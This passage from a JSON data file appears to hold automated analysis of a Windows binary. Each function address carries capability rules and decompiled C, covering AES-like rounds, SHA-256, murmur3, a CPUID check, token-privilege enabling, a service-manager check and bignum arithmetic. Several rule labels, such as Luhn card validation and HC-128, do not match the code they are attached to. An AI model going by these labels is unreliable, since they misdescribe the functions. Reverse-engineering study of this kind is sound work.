0xff) * 4 + 0x411948) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x411d48) ^\n            *((uVar2 >> 0x18) * 4 + 0x412148) ^ *((uVar3 & 0xff) * 4 + 0x411548) ^ puVar1[2];\n    uVar2 = *((uVar2 >> 0x10 & 0xff) * 4 + 0x411d48) ^ *((uVar9 >> 8 & 0xff) * 4 + 0x411948) ^\n            *((uVar3 >> 0x18) * 4 + 0x412148) ^ *((uVar5 & 0xff) * 4 + 0x411548) ^ puVar1[3];\n    uVar9 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar2 >> 0x18], str.cw[uVar8 >> 0x10 & 0xff]), str.cw[uVar7 >> 8 & 0xff])\n                     , str.cw[uVar6 & 0xff]) ^ puVar1[4];\n    uVar3 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar6 >> 0x18], str.cw[uVar2 >> 0x10 & 0xff]), str.cw[uVar8 >> 8 & 0xff])\n                     , str.cw[uVar7 & 0xff]) ^ puVar1[5];\n    uVar5 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar7 >> 0x18], str.cw[uVar6 >> 0x10 & 0xff]), str.cw[uVar2 >> 8 & 0xff])\n                     , str.cw[uVar8 & 0xff]) ^ puVar1[6];\n    uVar2 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar8 >> 0x18], str.cw[uVar7 >> 0x10 & 0xff]), str.cw[uVar6 >> 8 & 0xff])\n                     , str.cw[uVar2 & 0xff]) ^ puVar1[7];\n    *arg_10h = uVar9;\n    arg_10h[1] = uVar9 >> 8;\n    arg_10h[2] = uVar9 >> 0x10;\n    arg_10h[3] = uVar9 >> 0x18;\n    arg_10h[4] = uVar3;\n    arg_10h[5] = uVar3 >> 8;\n    arg_10h[6] = uVar3 >> 0x10;\n    arg_10h[7] = uVar3 >> 0x18;\n    arg_10h[9] = uVar5 >> 8;\n    arg_10h[10] = uVar5 >> 0x10;\n    arg_10h[0xd] = uVar2 >> 8;\n    arg_10h[8] = uVar5;\n    arg_10h[0xc] = uVar2;\n    arg_10h[0xb] = uVar5 >> 0x18;\n    arg_10h[0xe] = uVar2 >> 0x10;\n    arg_10h[0xf] = uVar2 >> 0x18;\n    return 0;\n}\n",
        "token_count": 2075
    },
    "0040e9b0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.0040e9b0(uint *arg_8h, uint arg_ch, uint32_t arg_10h, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint arg_80h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint var_31ch;\n    uint var_204h;\n    uchar var_1f4h;\n    uchar var_1f3h;\n    uchar var_1f2h;\n    uint var_1f1h;\n    uchar var_1edh;\n    uint var_1ech;\n    uint var_64h;\n    uint var_44h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    if (0x180 < arg_10h) {\n        return -0x38;\n    }\n    fcn.00401000(&var_204h, 0, 0x1a0);\n    fcn.004090a0(&var_31ch);\n    var_1f1h._0_1_ = arg_10h;\n    var_1f4h = arg_10h >> 0x18;\n    var_1f3h = arg_10h >> 0x10;\n    var_1f2h = arg_10h >> 8;\n    var_1edh = 0x30;\n    fcn.004013a0(&var_1ech, arg_ch, arg_10h);\n    uVar7 = arg_10h + 0x19;\n    *(&var_1ech + arg_10h) = 0x80;\n    iVar1 = 0;\n    do {\n        *(&var_64h + iVar1) = iVar1;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x20);\n    var_4h = uVar7;\n    iVar2 = fcn.004090c0(&var_31ch, &var_64h, 0x100);\n    iVar1 = iVar2;\n    if (iVar2 == 0) {\n        do {\n            var_14h = 0;\n            uStack20 = 0;\n            uStack16 = 0;\n            uStack12 = 0;\n            _var_14h = ZEXT816(0);\n            if (uVar7 != 0) {\n                iVar5 = -0x1f0;\n                do {\n                    iVar1 = 0;\n                    do {\n                        puVar4 = &var_14h + iVar1;\n                        iVar1 = iVar1 + 1;\n                        *puVar4 = *puVar4 ^ puVar4[iVar5];\n                    } while (iVar1 < 0x10);\n                    iVar5 = iVar5 + 0x10;\n                    uVar3 = uVar7;\n                    if (0xf < uVar7) {\n                        uVar3 = 0x10;\n                    }\n                    uVar7 = uVar7 - uVar3;\n                    iVar1 = fcn.00409050(&var_31ch, 1, &var_14h, &var_14h);\n                    if (iVar1 != 0) goto code_r0x0040eb44;\n                } while (uVar7 != 0);\n                uVar7 = var_4h;\n            }\n            var_204h._3_1_ = var_204h._3_1_ + '\\x01';\n            *(&var_44h + iVar2) = CONCAT412(uStack12, CONCAT48(uStack16, CONCAT44(uStack20, var_14h)));\n            iVar2 = iVar2 + 0x10;\n        } while (iVar2 < 0x30);\n        iVar1 = fcn.004090c0(&var_31ch, &var_44h, 0x100);\n        if (iVar1 == 0) {\n            iVar2 = 0;\n            puVar6 = arg_8h;\n            do {\n                iVar1 = fcn.00409050(&var_31ch, 1, &var_24h, &var_24h);\n                if (iVar1 != 0) break;\n                iVar2 = iVar2 + 0x10;\n                *puVar6 = var_24h;\n                puVar6[1] = uStack36;\n                puVar6[2] = uStack32;\n                puVar6[3] = uStack28;\n                puVar6 = puVar6 + 4;\n            } while (iVar2 < 0x30);\n        }\n    }\ncode_r0x0040eb44:\n    fcn.00409080(&var_31ch);\n    fcn.0040ef10(&var_204h, 0x1a0);\n    fcn.0040ef10(&var_44h, 0x30);\n    fcn.0040ef10(&var_64h, 0x20);\n    fcn.0040ef10(&var_14h, 0x10);\n    if (iVar1 != 0) {\n        fcn.0040ef10(arg_8h, 0x30);\n    }\n    return iVar1;\n}\n",
        "token_count": 1386
    },
    "00404ac0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404b33)\n// WARNING: Removing unreachable block (ram,0x00404adf)\n\nint64_t __fastcall fcn.00404ac0(uint param_1, uint32_t param_2, uint *param_3, int32_t *param_4, uint32_t *param_5)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    \n    uVar5 = 0;\n    iVar6 = 0;\n    uVar3 = ((in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000) ^ 0x200000;\n    if (((((uVar3 & 0x200000) != 0) * 0x200000 ^ uVar3) >> 0x15 & 1) == 0) {\n        piVar1 = cpuid_basic_info(0);\n        iVar4 = piVar1[1];\n        param_2 = piVar1[2];\n        if (piVar1[3] == 0x6c65746e) {\n            uVar5 = 1;\n        }\n        else if (piVar1[3] == 0x444d4163) {\n            uVar5 = 2;\n        }\n        else if ((iVar4 == 0x746e6543) || (iVar4 == 0x20414956)) {\n            uVar5 = 3;\n        }\n        else if (iVar4 == 0x69727943) {\n            uVar5 = 4;\n        }\n        else if (iVar4 == 0x4778654e) {\n            uVar5 = 5;\n        }\n        if (*piVar1 != 0) {\n            puVar2 = cpuid_Version_info(1);\n            uVar3 = *puVar2;\n            param_2 = puVar2[2];\n            iVar6 = (uVar3 >> 0x14 & 0xff) + (uVar3 >> 8 & 0xf);\n            uVar3 = uVar3 >> 4 & 0xf | uVar3 >> 0xc & 0xf0;\n            goto code_r0x00404b5f;\n        }\n    }\n    uVar3 = 0;\ncode_r0x00404b5f:\n    if (param_3 != NULL) {\n        *param_3 = uVar5;\n    }\n    if (param_4 != NULL) {\n        *param_4 = iVar6;\n    }\n    if (param_5 != NULL) {\n        *param_5 = uVar3;\n    }\n    return param_2 << 0x20;\n}\n",
        "token_count": 637
    },
    "00405db0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405db0(void)\n\n{\n    uint uVar1;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint TokenHandle;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n    var_20h._0_1_ = 0;\n    var_30h = *0x411220;\n    uStack48 = *0x411224;\n    uStack44 = *0x411228;\n    uStack40 = *0x41122c;\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, &var_30h, &var_ch);\n    var_18h = var_ch;\n    var_14h = var_8h;\n    var_1ch = 1;\n    var_10h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &var_1ch, 0x10, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    return;\n}\n",
        "token_count": 334
    },
    "00407370": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00407370(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if (iVar1 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar2 == 5) {\n            return 0;\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 122
    },
    "0040f430": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_140h\n// WARNING: Variable defined which should be unmapped: var_144h\n\nuint __cdecl fcn.0040f430(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    int32_t iStack380;\n    uint var_174h;\n    uint32_t uStack372;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    int32_t aiStack344 [2];\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    int32_t aiStack272 [53];\n    uint32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t *var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_20h = *(arg_8h + 0x18);\n    var_38h = *(arg_8h + 8);\n    var_24h = *(arg_8h + 0xc);\n    var_14h = *(arg_8h + 0x10);\n    var_10h = *(arg_8h + 0x14);\n    var_1ch = *(arg_8h + 8);\n    uVar5 = 0;\n    var_8h = *(arg_8h + 0x20);\n    var_ch = *(arg_8h + 0x1c);\n    var_18h = *(arg_8h + 0x24);\n    puVar7 = arg_ch + 2;\n    do {\n        (&var_138h)[uVar5] = CONCAT31(CONCAT21(CONCAT11(puVar7[-2], puVar7[-1]), *puVar7), puVar7[1]);\n        uVar5 = uVar5 + 1;\n        puVar7 = puVar7 + 4;\n    } while (uVar5 < 0x10);\n    uVar5 = 0;\n    do {\n        iVar8 = ((var_20h >> 0xb | var_20h << 0x15) ^ (var_20h << 7 | var_20h >> 0x19) ^\n                (var_20h >> 6 | var_20h << 0x1a)) + ((var_ch ^ var_8h) & var_20h ^ var_8h) + *(uVar5 + 0x4138f0) +\n                *(&var_138h + uVar5) + var_18h;\n        var_18h = var_10h + iVar8;\n        uVar6 = (var_1ch & var_24h | (var_24h | var_1ch) & var_14h) +\n                ((var_1ch >> 0xd | var_1ch << 0x13) ^ (var_1ch << 10 | var_1ch >> 0x16) ^\n                (var_1ch >> 2 | var_1ch << 0x1e)) + iVar8;\n        iVar8 = ((var_18h >> 0xb | var_18h * 0x200000) ^ (var_18h * 0x80 | var_18h >> 0x19) ^\n                (var_18h >> 6 | var_18h * 0x4000000)) + ((var_ch ^ var_20h) & var_18h ^ var_ch) + *(uVar5 + 0x4138f4) +\n                *(&var_134h + uVar5) + var_8h;\n        var_4h = var_14h + iVar8;\n        var_8h = (var_1ch & uVar6 | (var_1ch | uVar6) & var_24h) +\n                 ((uVar6 >> 0xd | uVar6 * 0x80000) ^ (uVar6 * 0x400 | uVar6 >> 0x16) ^ (uVar6 >> 2 | uVar6 * 0x40000000)\n                 ) + iVar8;\n        iVar8 = ((var_4h >> 0xb | var_4h * 0x200000) ^ (var_4h * 0x80 | var_4h >> 0x19) ^\n                (var_4h >> 6 | var_4h * 0x4000000)) + ((var_18h ^ var_20h) & var_4h ^ var_20h) + *(uVar5 + 0x4138f8) +\n                *(&var_130h + uVar5) + var_ch;\n        var_28h = var_24h + iVar8;\n        var_ch = (var_8h & uVar6 | (var_8h | uVar6) & var_1ch) +\n                 ((var_8h >> 0xd | var_8h * 0x80000) ^ (var_8h * 0x400 | var_8h >> 0x16) ^\n                 (var_8h >> 2 | var_8h * 0x40000000)) + iVar8;\n        iVar8 = ((var_28h >> 0xb | var_28h * 0x200000) ^ (var_28h * 0x80 | var_28h >> 0x19) ^\n                (var_28h >> 6 | var_28h * 0x4000000)) + ((var_18h ^ var_4h) & var_28h ^ var_18h) + *(uVar5 + 0x4138fc) +\n                *(&var_12ch + uVar5) + var_20h;\n        var_1ch = var_1ch + iVar8;\n        var_20h = (var_ch & var_8h | (var_ch | var_8h) & uVar6) +\n                  ((var_ch >> 0xd | var_ch * 0x80000) ^ (var_ch * 0x400 | var_ch >> 0x16) ^\n                  (var_ch >> 2 | var_ch * 0x40000000)) + iVar8;\n        iVar8 = ((var_1ch >> 0xb | var_1ch * 0x200000) ^ (var_1ch * 0x80 | var_1ch >> 0x19) ^\n                (var_1ch >> 6 | var_1ch * 0x4000000)) + ((var_28h ^ var_4h) & var_1ch ^ var_4h) + *(uVar5 + 0x413900) +\n                *(&var_128h + uVar5) + var_18h;\n        var_18h = uVar6 + iVar8;\n        var_10h = ((var_20h | var_ch) & var_8h | var_20h & var_ch) +\n                  ((var_20h >> 0xd | var_20h * 0x80000) ^ (var_20h * 0x400 | var_20h >> 0x16) ^\n                  (var_20h >> 2 | var_20h * 0x40000000)) + iVar8;\n        iVar8 = ((var_18h >> 0xb | var_18h * 0x200000) ^ (var_18h * 0x80 | var_18h >> 0x19) ^\n                (var_18h >> 6 | var_18h * 0x4000000)) + ((var_28h ^ var_1ch) & var_18h ^ var_28h) + *(uVar5 + 0x413904)\n                + *(&var_124h + uVar5) + var_4h;\n        var_8h = var_8h + iVar8;\n        var_14h = ((var_10h | var_20h) & var_ch | var_10h & var_20h) +\n                  ((var_10h >> 0xd | var_10h * 0x80000) ^ (var_10h * 0x400 | var_10h >> 0x16) ^\n                  (var_10h >> 2 | var_10h * 0x40000000)) + iVar8;\n        iVar8 = ((var_8h >> 0xb | var_8h * 0x200000) ^ (var_8h * 0x80 | var_8h >> 0x19) ^\n                (var_8h >> 6 | var_8h * 0x4000000)) + ((var_1ch ^ var_18h) & var_8h ^ var_1ch) + *(uVar5 + 0x413908) +\n                *(&var_120h + uVar5) + var_28h;\n        var_ch = var_ch + iVar8;\n        var_24h = ((var_14h | var_10h) & var_20h | var_14h & var_10h) +\n                  ((var_14h >> 0xd | var_14h * 0x80000) ^ (var_14h * 0x400 | var_14h >> 0x16) ^\n                  (var_14h >> 2 | var_14h * 0x40000000)) + iVar8;\n        piVar1 = uVar5 + 0x41390c;\n        piVar2 = &var_11ch + uVar5;\n        uVar5 = uVar5 + 0x20;\n        iVar8 = ((var_ch >> 0xb | var_ch * 0x200000) ^ (var_ch * 0x80 | var_ch >> 0x19) ^\n                (var_ch >> 6 | var_ch * 0x4000000)) + ((var_18h ^ var_8h) & var_ch ^ var_18h) + *piVar1 + *piVar2 +\n                var_1ch;\n        var_20h = var_20h + iVar8;\n        var_1ch = ((var_14h | var_24h) & var_10h | var_14h & var_24h) +\n                  ((var_24h >> 0xd | var_24h * 0x80000) ^ (var_24h * 0x400 | var_24h >> 0x16) ^\n                  (var_24h >> 2 | var_24h * 0x40000000)) + iVar8;\n    } while (uVar5 < 0x40);\n    var_4h = 0x40;\n    do {\n        uVar4 = var_4h;\n        uVar3 = var_20h;\n        uVar5 = *(&uStack372 + (var_4h - 4));\n        uVar6 = *(&var_140h + var_4h);\n        var_28h = &var_140h + var_4h;\n        var_34h = ((uVar6 << 0xf | uVar6 >> 0x11) ^ (uVar6 << 0xd | uVar6 >> 0x13) ^ uVar6 >> 10) +\n                  ((uVar5 << 0xe | uVar5 >> 0x12) ^ (uVar5 >> 7 | uVar5 << 0x19) ^ uVar5 >> 3) + *(&iStack380 + var_4h)\n                  + *(aiStack344 + var_4h);\n        *(&var_138h + var_4h) = var_34h;\n        var_2ch = *(&uStack372 + uVar4);\n        iVar8 = ((uVar3 >> 0xb | uVar3 << 0x15) ^ (uVar3 << 7 | uVar3 >> 0x19) ^ (uVar3 >> 6 | uVar3 << 0x1a)) +\n                ((var_ch ^ var_8h) & uVar3 ^ var_8h) + *(var_4h + 0x4138f0) + var_34h + var_18h;\n        uVar6 = var_10h + iVar8;\n        var_10h = uVar6;\n        uVar4 = (var_24h & var_1ch | (var_24h | var_1ch) & var_14h) +\n                ((var_1ch >> 0xd | var_1ch << 0x13) ^ (var_1ch << 10 | var_1ch >> 0x16) ^\n                (var_1ch >> 2 | var_1ch << 0x1e)) + iVar8;\n        var_18h = uVar4;\n        uVar3 = var_28h[1];\n        uVar5 = uVar5 + ((uVar3 << 0xf | uVar3 >> 0x11) ^ (uVar3 << 0xd | uVar3 >> 0x13) ^ uVar3 >> 10) +\n                        ((var_2ch << 0xe | var_2ch >> 0x12) ^ (var_2ch >> 7 | var_2ch << 0x19) ^ var_2ch >> 3) +\n                        var_28h[-4];\n        *(&var_134h + var_4h) = uVar5;\n        iVar8 = ((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 * 0x80 | uVar6 >> 0x19) ^ (uVar6 >> 6 | uVar6 * 0x4000000))\n                + ((var_ch ^ var_20h) & uVar6 ^ var_ch) + *(var_4h + 0x4138f4) + uVar5 + var_8h;\n        uVar6 = var_14h + iVar8;\n        var_14h = uVar6;\n        var_8h = (var_18h & var_1ch | (uVar4 | var_1ch) & var_24h) +\n                 ((uVar4 >> 0xd | uVar4 * 0x80000) ^ (uVar4 * 0x400 | uVar4 >> 0x16) ^ (uVar4 >> 2 | uVar4 * 0x40000000)\n                 ) + iVar8;\n        var_30h = *(&var_16ch + var_4h);\n        var_2ch = ((var_30h << 0xe | var_30h >> 0x12) ^ (var_30h >> 7 | var_30h << 0x19) ^ var_30h >> 3) +\n                  ((var_34h << 0xf | var_34h >> 0x11) ^ (var_34h << 0xd | var_34h >> 0x13) ^ var_34h >> 10) +\n                  *(&var_14ch + var_4h) + var_2ch;\n        *(&var_130h + var_4h) = var_2ch;\n        iVar8 = ((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 * 0x80 | uVar6 >> 0x19) ^ (uVar6 >> 6 | uVar6 * 0x4000000))\n                + ((var_10h ^ var_20h) & uVar6 ^ var_20h) + *(var_4h + 0x4138f8) + var_2ch + var_ch;\n        uVar6 = var_24h + iVar8;\n        var_24h = uVar6;\n        uVar4 = ((var_8h | var_18h) & var_1ch | var_8h & var_18h) +\n                ((var_8h >> 0xd | var_8h << 0x13) ^ (var_8h << 10 | var_8h >> 0x16) ^ (var_8h >> 2 | var_8h << 0x1e)) +\n                iVar8;\n        var_ch = uVar4;\n        uVar3 = *(&var_168h + var_4h);\n        var_30h = ((uVar3 << 0xe | uVar3 >> 0x12) ^ (uVar3 >> 7 | uVar3 << 0x19) ^ uVar3 >> 3) +\n                  ((uVar5 * 0x8000 | uVar5 >> 0x11) ^ (uVar5 * 0x2000 | uVar5 >> 0x13) ^ uVar5 >> 10) +\n                  *(&var_148h + var_4h) + var_30h;\n        *(&var_12ch + var_4h) = var_30h;\n        iVar8 = ((uVar6 >> 0xb | uVar6 * 0x200000) ^ (uVar6 * 0x80 | uVar6 >> 0x19) ^ (uVar6 >> 6 | uVar6 * 0x4000000))\n                + ((var_14h ^ var_10h) & uVar6 ^ var_10h) + *(var_4h + 0x4138fc) + var_30h + var_20h;\n        uVar5 = var_1ch + iVar8;\n        var_1ch = uVar5;\n        uVar4 = ((uVar4 | var_8h) & var_18h | uVar4 & var_8h) +\n                ((uVar4 >> 0xd | uVar4 * 0x80000) ^ (uVar4 * 0x400 | uVar4 >> 0x16) ^ (uVar4 >> 2 | uVar4 * 0x40000000))\n                + iVar8;\n        var_20h = uVar4;\n        uVar6 = *(&var_164h + var_4h);\n        var_2ch = ((var_2ch << 0xf | var_2ch >> 0x11) ^ (var_2ch << 0xd | var_2ch >> 0x13) ^ var_2ch >> 10) +\n                  ((uVar6 << 0xe | uVar6 >> 0x12) ^ (uVar6 >> 7 | uVar6 << 0x19) ^ uVar6 >> 3) + *(&var_144h + var_4h) +\n                  uVar3;\n        *(&var_128h + var_4h) = var_2ch;\n        iVar8 = ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000))\n                + ((var_14h ^ var_24h) & uVar5 ^ var_14h) + *(var_4h + 0x413900) + var_2ch + var_10h;\n        uVar5 = var_18h + iVar8;\n        var_18h = uVar5;\n        var_10h = (var_ch & uVar4 | (var_ch | uVar4) & var_8h) +\n                  ((uVar4 >> 0xd | uVar4 * 0x80000) ^ (uVar4 * 0x400 | uVar4 >> 0x16) ^\n                  (uVar4 >> 2 | uVar4 * 0x40000000)) + iVar8;\n        uVar3 = *(&var_160h + var_4h);\n        var_30h = ((var_30h << 0xf | var_30h >> 0x11) ^ (var_30h << 0xd | var_30h >> 0x13) ^ var_30h >> 10) +\n                  ((uVar3 << 0xe | uVar3 >> 0x12) ^ (uVar3 >> 7 | uVar3 << 0x19) ^ uVar3 >> 3) + *(&var_140h + var_4h) +\n                  uVar6;\n        *(&var_124h + var_4h) = var_30h;\n        iVar8 = ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000))\n                + ((var_24h ^ var_1ch) & uVar5 ^ var_24h) + *(var_4h + 0x413904) + var_30h + var_14h;\n        uVar5 = var_8h + iVar8;\n        var_8h = uVar5;\n        var_14h = (var_10h & var_20h | (var_10h | var_20h) & var_ch) +\n                  ((var_10h >> 0xd | var_10h << 0x13) ^ (var_10h << 10 | var_10h >> 0x16) ^\n                  (var_10h >> 2 | var_10h << 0x1e)) + iVar8;\n        uVar6 = var_28h[-7];\n        iVar8 = ((uVar6 << 0xe | uVar6 >> 0x12) ^ (uVar6 >> 7 | uVar6 << 0x19) ^ uVar6 >> 3) +\n                ((var_2ch << 0xf | var_2ch >> 0x11) ^ (var_2ch << 0xd | var_2ch >> 0x13) ^ var_2ch >> 10) + uVar3 +\n                var_28h[1];\n        *(&var_120h + var_4h) = iVar8;\n        iVar8 = ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000))\n                + ((var_1ch ^ var_18h) & uVar5 ^ var_1ch) + *(var_4h + 0x413908) + iVar8 + var_24h;\n        uVar5 = var_ch + iVar8;\n        var_ch = uVar5;\n        var_24h = (var_14h & var_10h | (var_14h | var_10h) & var_20h) +\n                  ((var_14h >> 0xd | var_14h << 0x13) ^ (var_14h << 10 | var_14h >> 0x16) ^\n                  (var_14h >> 2 | var_14h << 0x1e)) + iVar8;\n        uVar3 = var_28h[-6];\n        iVar8 = ((uVar3 << 0xe | uVar3 >> 0x12) ^ (uVar3 >> 7 | uVar3 << 0x19) ^ uVar3 >> 3) +\n                ((var_30h << 0xf | var_30h >> 0x11) ^ (var_30h << 0xd | var_30h >> 0x13) ^ var_30h >> 10) + var_34h +\n                uVar6;\n        *(&var_11ch + var_4h) = iVar8;\n        iVar8 = ((uVar5 >> 0xb | uVar5 * 0x200000) ^ (uVar5 * 0x80 | uVar5 >> 0x19) ^ (uVar5 >> 6 | uVar5 * 0x4000000))\n                + ((var_18h ^ var_8h) & uVar5 ^ var_18h) + *(var_4h + 0x41390c) + iVar8 + var_1ch;\n        var_20h = var_20h + iVar8;\n        var_1ch = (var_14h & var_24h | (var_14h | var_24h) & var_10h) +\n                  ((var_24h >> 0xd | var_24h << 0x13) ^ (var_24h << 10 | var_24h >> 0x16) ^\n                  (var_24h >> 2 | var_24h << 0x1e)) + iVar8;\n        var_4h = var_4h + 0x20;\n    } while (var_4h < 0x100);\n    *(arg_8h + 8) = var_1ch + var_38h;\n    *(arg_8h + 0x10) = *(arg_8h + 0x10) + var_14h;\n    *(arg_8h + 0x14) = *(arg_8h + 0x14) + var_10h;\n    *(arg_8h + 0x1c) = *(arg_8h + 0x1c) + var_ch;\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + var_24h;\n    *(arg_8h + 0x20) = *(arg_8h + 0x20) + var_8h;\n    *(arg_8h + 0x18) = *(arg_8h + 0x18) + var_20h;\n    *(arg_8h + 0x24) = *(arg_8h + 0x24) + var_18h;\n    return 0;\n}\n",
        "token_count": 6028
    },
    "0040ca50": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040ca50(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040a370(arg_8h);\n    return iVar1 + 7U >> 3;\n}\n",
        "token_count": 57
    },
    "0040d400": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d400(uint32_t arg_8h, uint32_t *arg_ch, uint32_t *arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    if (0xf < arg_8h) {\n        var_8h = arg_8h >> 4;\n        do {\n            uVar4 = *arg_ch * arg_14h;\n            uVar5 = uVar4 + var_4h;\n            uVar6 = (*arg_ch * arg_14h >> 0x20) + CARRY4(uVar4, var_4h) + CARRY4(uVar5, *arg_10h);\n            puVar1 = arg_10h + 1;\n            *arg_10h = uVar5 + *arg_10h;\n            uVar4 = arg_ch[1] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[1] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 2;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[2] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[2] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 3;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[3] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[3] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 4;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[4] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[4] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 5;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[5] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[5] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar1);\n            puVar2 = arg_10h + 6;\n            *puVar1 = uVar5 + *puVar1;\n            uVar4 = arg_ch[6] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n            uVar6 = (arg_ch[6] * arg_14h >> 0x20) + CARRY4(uVar4, uVar6) + CARRY4(uVar5, *puVar2);\n            puVar1 = arg_10h + 7;\n            *puVar2 = uVar5 + *puVar2;\n            uVar4 = arg_ch[7] * arg_14h;\n            uVar5 = uVar4 + uVar6;\n           